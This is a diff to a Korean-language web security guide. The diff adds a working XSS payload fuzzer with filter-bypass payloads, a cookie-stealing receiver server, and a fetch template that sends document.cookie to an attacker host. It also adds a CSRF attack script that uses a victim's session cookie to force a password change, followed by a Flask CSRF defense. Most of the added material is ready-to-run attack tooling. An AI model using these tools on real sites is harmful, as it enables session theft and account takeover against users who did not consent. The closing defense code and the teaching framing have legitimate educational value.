@@ -127,29 +127,214 @@ document.write('<a href="' + location.href + '">link</a>');
 ### 1-5. XSS 쿠키 탈취 서버 만들기
 
 ```python
-# Python HTTP 서버 (쿠키 수신)
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
+#!/usr/bin/env python3
+"""
+XSS 페이로드 퍼저 + 쿠키 탈취 수신 서버
+퍼저: requests로 각 파라미터에 페이로드를 삽입하여 반영 여부 확인
+수신 서버: 탈취된 쿠키/데이터를 로깅
 
-class XSSHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
+사용법:
+  # 퍼저 모드
+  python3 xss_fuzzer.py fuzz -u "http://target.com/search?q=test"
+  # 수신 서버 모드
+  python3 xss_fuzzer.py server --port 8080
+"""
+import argparse
+import sys
+import threading
+import time
+from datetime import datetime
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from pathlib import Path
+from typing import Optional
+from urllib.parse import parse_qs, urlparse, urlencode, urlunparse, quote
+
+import requests
+
+
+# ── XSS 페이로드 목록 (필터 우회 포함) ────────────────────────────────────────
+XSS_PAYLOADS: list[str] = [
+    # 기본 탐지용 마커 (반영 여부 확인)
+    "<xss>",
+    "\"'><xss>",
+    "</script><xss>",
+
+    # 실제 실행 페이로드
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+
+    # 이벤트 핸들러 (스크립트 태그 필터 우회)
+    "<input autofocus onfocus=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<video src=x onerror=alert(1)>",
+
+    # 대소문자 우회
+    "<ScRiPt>alert(1)</sCrIpT>",
+    "<IMG SRC=x OnErRoR=alert(1)>",
+
+    # JavaScript 프로토콜
+    "<a href=\"javascript:alert(1)\">click</a>",
+    "<iframe src=\"javascript:alert(1)\">",
+
+    # 인코딩 우회
+    "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
+    "<script>eval(atob('YWxlcnQoMSk='))</script>",
+
+    # DOM 싱크 테스트
+    "javascript:alert(1)",
+    "';alert(1);//",
+    "\";alert(1);//",
+
+    # CSP 우회 (nonce 없는 환경)
+    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
+]
+
+STEAL_TEMPLATE = (
+    "<script>"
+    "fetch('http://ATTACKER_HOST/steal?c='+encodeURIComponent(document.cookie))"
+    "</script>"
+)
+
+
+# ── 퍼저 ──────────────────────────────────────────────────────────────────────
+class XSSFuzzer:
+    def __init__(
+        self,
+        url: str,
+        post_data: Optional[str] = None,
+        cookies: Optional[str] = None,
+        attacker_host: str = "attacker.com",
+        delay: float = 0.2,
+    ) -> None:
+        self.url = url
+        self.post_data = post_data
+        self.method = "POST" if post_data else "GET"
+        self.attacker_host = attacker_host
+        self.delay = delay
+
+        self.session = requests.Session()
+        self.session.headers["User-Agent"] = "Mozilla/5.0 (XSS-Fuzzer/2.0)"
+        if cookies:
+            for item in cookies.split(";"):
+                k, _, v = item.strip().partition("=")
+                self.session.cookies.set(k.strip(), v.strip())
+
+        parsed = urlparse(url)
+        self.base_params = (
+            {k: v[0] for k, v in parse_qs(parsed.query).items()}
+            if self.method == "GET"
+            else {pair.split("=")[0]: pair.split("=")[1]
+                  for pair in post_data.split("&") if "=" in pair}
+        )
+
+    def _send(self, params: dict) -> Optional[requests.Response]:
+        try:
+            if self.method == "GET":
+                return self.session.get(self.url, params=params, timeout=10)
+            else:
+                return self.session.post(self.url, data=params, timeout=10)
+        except requests.RequestException:
+            return None
+
+    def _is_reflected(self, resp: Optional[requests.Response], marker: str) -> bool:
+        if resp is None:
+            return False
+        return marker.lower() in resp.text.lower()
+
+    def fuzz(self) -> list[dict]:
+        findings = []
+        for param in self.base_params:
+            print(f"[*] 파라미터: {param}")
+            for payload in XSS_PAYLOADS:
+                params = {**self.base_params, param: payload}
+                resp = self._send(params)
+                # 반영 여부 확인 (마커 탐지)
+                marker = "<xss>" if "<xss>" in payload else payload[:10]
+                if self._is_reflected(resp, marker):
+                    findings.append({
+                        "param": param,
+                        "payload": payload,
+                        "status": resp.status_code if resp else None,
+                        "url": self.url,
+                    })
+                    print(f"  [!] 반영 발견! payload: {payload!r}")
+                time.sleep(self.delay)
+        return findings
+
+
+# ── 수신 서버 ──────────────────────────────────────────────────────────────────
+LOG_FILE = Path("xss_captured.log")
+
+class XSSReceiverHandler(BaseHTTPRequestHandler):
+    def do_GET(self) -> None:
         parsed = urlparse(self.path)
         params = parse_qs(parsed.query)
-        
-        if 'c' in params:
-            print(f"[+] 쿠키 탈취: {params['c'][0]}")
-            with open('stolen_cookies.txt', 'a') as f:
-                f.write(f"{self.client_address[0]}: {params['c'][0]}\n")
-        
-        self.send_response(200)
-        self.end_headers()
-    
-    def log_message(self, format, *args):
-        pass  # 로그 숨김
 
-server = HTTPServer(('0.0.0.0', 80), XSSHandler)
-print("[*] XSS 수신 서버 시작...")
-server.serve_forever()
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        client_ip = self.client_address[0]
+
+        captured = {}
+        for key in ("c", "cookie", "k", "key", "data", "token"):
+            if key in params:
+                captured[key] = params[key][0]
+
+        if captured:
+            line = f"[{timestamp}] {client_ip}  {captured}\n"
+            print(f"[+] 데이터 수신: {line}", end="")
+            with LOG_FILE.open("a") as f:
+                f.write(line)
+
+        # CORS 허용 + 투명 1px 이미지 응답 (브라우저 오류 방지)
+        self.send_response(200)
+        self.send_header("Content-Type", "image/gif")
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.end_headers()
+        # 1x1 투명 GIF
+        self.wfile.write(b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00"
+                         b"\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00"
+                         b"\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02"
+                         b"\x44\x01\x00\x3b")
+
+    def log_message(self, fmt: str, *args) -> None:
+        pass  # 기본 로그 억제
+
+
+def run_server(host: str = "0.0.0.0", port: int = 8080) -> None:
+    server = HTTPServer((host, port), XSSReceiverHandler)
+    print(f"[*] XSS 수신 서버 시작: http://{host}:{port}")
+    print(f"[*] 캡처 로그: {LOG_FILE.resolve()}")
+    print(f"[*] XSS 페이로드: {STEAL_TEMPLATE.replace('ATTACKER_HOST', f'YOUR_IP:{port}')}")
+    server.serve_forever()
+
+
+# ── CLI ────────────────────────────────────────────────────────────────────────
+def main() -> None:
+    parser = argparse.ArgumentParser(description="XSS 퍼저 + 수신 서버")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    fuzz_p = sub.add_parser("fuzz", help="XSS 퍼징 실행")
+    fuzz_p.add_argument("-u", "--url", required=True)
+    fuzz_p.add_argument("--post", help="POST 데이터")
+    fuzz_p.add_argument("--cookie", help="쿠키 문자열")
+    fuzz_p.add_argument("--delay", type=float, default=0.2)
+
+    srv_p = sub.add_parser("server", help="수신 서버 실행")
+    srv_p.add_argument("--port", type=int, default=8080)
+
+    args = parser.parse_args()
+
+    if args.cmd == "fuzz":
+        fuzzer = XSSFuzzer(args.url, args.post, args.cookie, delay=args.delay)
+        results = fuzzer.fuzz()
+        print(f"\n[+] 총 {len(results)}개 XSS 반영 지점 발견")
+    else:
+        run_server(port=args.port)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ---
@@ -544,20 +729,222 @@ Secure    → HTTPS에서만 쿠키 전송
 SameSite=Strict → 외부 사이트에서 쿠키 미전송 (CSRF 방어)
 ```
 
-### CSRF 방어
+### CSRF 토큰 탈취 PoC (XSS 연계)
+
 ```python
-# CSRF 토큰 검증 (Flask-WTF 예시)
-from flask_wtf.csrf import CSRFProtect
-csrf = CSRFProtect(app)
+#!/usr/bin/env python3
+"""
+CSRF 토큰 탈취 PoC — requests를 이용한 CSRF 공격 시뮬레이터
+(교육 목적: 취약한 서버에서 CSRF 토큰 미검증 또는 XSS 연계 시 동작 확인)
 
-# HTML 폼에 토큰 포함
-<form method="POST">
-  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
-  ...
-</form>
+사용법: python3 csrf_poc.py -t http://target.com/account/change-password \
+                            --victim-session "session=abc123" \
+                            --new-password "hacked123"
+"""
+import argparse
+import re
+from typing import Optional
 
-# SameSite 쿠키로 CSRF 방어
-Set-Cookie: session=abc; SameSite=Strict
+import requests
+
+
+class CSRFTokenExtractor:
+    """
+    세션 쿠키를 이용해 대상 페이지에서 CSRF 토큰을 추출하는 클래스.
+    실제 공격에서는 XSS 페이로드가 피해자 브라우저에서 이 역할을 수행함.
+    """
+
+    TOKEN_PATTERNS = [
+        r'name=["\']csrf[_\-]?token["\'].*?value=["\']([^"\']+)["\']',
+        r'value=["\']([^"\']+)["\'].*?name=["\']csrf[_\-]?token["\']',
+        r'<meta\s+name=["\']csrf[_\-]?token["\'].*?content=["\']([^"\']+)["\']',
+        r'"csrfToken"\s*:\s*"([^"]+)"',
+        r'window\.__csrf\s*=\s*["\']([^"\']+)["\']',
+        r'data-csrf=["\']([^"\']+)["\']',
+    ]
+
+    def __init__(self, session: requests.Session) -> None:
+        self.session = session
+
+    def extract(self, url: str) -> Optional[str]:
+        resp = self.session.get(url, timeout=10)
+        for pattern in self.TOKEN_PATTERNS:
+            match = re.search(pattern, resp.text, re.IGNORECASE | re.DOTALL)
+            if match:
+                token = match.group(1)
+                print(f"[+] CSRF 토큰 탈취 성공: {token[:30]}...")
+                return token
+        print(f"[-] CSRF 토큰 미발견 (토큰 없이 요청 가능할 수 있음)")
+        return None
+
+
+def simulate_csrf_attack(
+    target_url: str,
+    victim_session: str,
+    form_data: dict,
+    referer_spoof: Optional[str] = None,
+) -> None:
+    """
+    피해자 세션으로 CSRF 공격을 시뮬레이션.
+    1. 세션으로 원본 페이지에서 CSRF 토큰 추출
+    2. 추출한 토큰과 함께 악성 폼 제출
+    """
+    session = requests.Session()
+    # 피해자 세션 쿠키 설정
+    for item in victim_session.split(";"):
+        k, _, v = item.strip().partition("=")
+        session.cookies.set(k.strip(), v.strip())
+
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (CSRF-PoC/1.0)",
+        "Content-Type": "application/x-www-form-urlencoded",
+    })
+    if referer_spoof:
+        session.headers["Referer"] = referer_spoof
+
+    # 원본 페이지에서 CSRF 토큰 추출 시도
+    extractor = CSRFTokenExtractor(session)
+    token = extractor.extract(target_url)
+
+    # 폼 데이터에 토큰 포함 (있을 경우)
+    if token:
+        for possible_key in ("csrf_token", "csrftoken", "_token", "authenticity_token"):
+            form_data[possible_key] = token
+            break
+
+    print(f"\n[*] CSRF 공격 요청 전송: {target_url}")
+    print(f"    폼 데이터: {form_data}")
+
+    resp = session.post(target_url, data=form_data, timeout=10,
+                        allow_redirects=True)
+
+    print(f"[*] 응답 코드: {resp.status_code}")
+    print(f"[*] 응답 크기: {len(resp.text)} bytes")
+
+    # 성공 여부 추론 (비밀번호 변경 시나리오)
+    success_hints = ["success", "변경", "updated", "saved", "완료"]
+    fail_hints    = ["invalid", "csrf", "forbidden", "403", "error"]
+
+    body_lower = resp.text.lower()
+    if any(h in body_lower for h in success_hints):
+        print("[!] 공격 성공으로 추정 (응답에 성공 키워드 포함)")
+    elif any(h in body_lower for h in fail_hints):
+        print("[-] CSRF 방어가 작동 중 (실패 키워드 감지)")
+    else:
+        print("[?] 결과 불명확 (수동 응답 확인 필요)")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="CSRF 공격 시뮬레이터 (교육용)")
+    parser.add_argument("-t", "--target", required=True,
+                        help="대상 URL (예: http://target.com/change-password)")
+    parser.add_argument("--victim-session", required=True,
+                        help="피해자 세션 쿠키 (예: session=abc123)")
+    parser.add_argument("--data", default="new_password=hacked123",
+                        help="전송할 폼 데이터 (예: field1=val1&field2=val2)")
+    parser.add_argument("--referer", help="위조 Referer 헤더")
+    args = parser.parse_args()
+
+    form_data = dict(
+        pair.split("=", 1) for pair in args.data.split("&") if "=" in pair
+    )
+    simulate_csrf_attack(args.target, args.victim_session, form_data, args.referer)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### CSRF 방어 구현
+
+```python
+#!/usr/bin/env python3
+"""
+Flask CSRF 방어 구현 — Synchronizer Token Pattern + SameSite 쿠키
+"""
+import secrets
+import hashlib
+import hmac
+import time
+from flask import Flask, request, session, abort, render_template_string, jsonify
+from functools import wraps
+from typing import Optional
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(32)  # 강력한 랜덤 비밀키 필수
+
+CSRF_TOKEN_LIFETIME = 3600  # 1시간
+
+
+def generate_csrf_token() -> str:
+    """암호학적으로 안전한 CSRF 토큰 생성"""
+    raw = secrets.token_urlsafe(32)
+    timestamp = int(time.time())
+    # HMAC으로 서명 → 위조 불가
+    sig = hmac.new(
+        app.secret_key.encode(),
+        f"{raw}:{timestamp}".encode(),
+        hashlib.sha256,
+    ).hexdigest()
+    return f"{raw}:{timestamp}:{sig}"
+
+
+def validate_csrf_token(token: Optional[str]) -> bool:
+    """CSRF 토큰 검증 (서명 + 만료 시간)"""
+    if not token:
+        return False
+    try:
+        raw, ts_str, sig = token.split(":", 2)
+    except ValueError:
+        return False
+
+    timestamp = int(ts_str)
+    if time.time() - timestamp > CSRF_TOKEN_LIFETIME:
+        return False  # 만료
+
+    expected_sig = hmac.new(
+        app.secret_key.encode(),
+        f"{raw}:{ts_str}".encode(),
+        hashlib.sha256,
+    ).hexdigest()
+    return hmac.compare_digest(sig, expected_sig)  # 타이밍 공격 방지
+
+
+def csrf_protect(f):
+    """CSRF 보호 데코레이터 — POST/PUT/DELETE 요청 검증"""
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if request.method in ("POST", "PUT", "PATCH", "DELETE"):
+            token = (
+                request.form.get("csrf_token")
+                or request.headers.get("X-CSRF-Token")
+                or request.json.get("csrf_token") if request.is_json else None
+            )
+            if not validate_csrf_token(token):
+                abort(403, "CSRF 토큰이 유효하지 않습니다")
+        return f(*args, **kwargs)
+    return decorated
+
+
+@app.route("/api/token", methods=["GET"])
+def get_csrf_token():
+    token = generate_csrf_token()
+    session["csrf_token"] = token
+    resp = jsonify({"csrf_token": token})
+    # SameSite=Strict으로 추가 방어
+    resp.set_cookie("csrf_token", token, httponly=False,
+                    samesite="Strict", secure=True)
+    return resp
+
+
+@app.route("/api/change-password", methods=["POST"])
+@csrf_protect
+def change_password():
+    new_pw = request.json.get("new_password", "")
+    if len(new_pw) < 8:
+        abort(400, "비밀번호는 8자 이상이어야 합니다")
+    # 실제 로직...
+    return jsonify({"status": "success"})
 ```
 
 ---
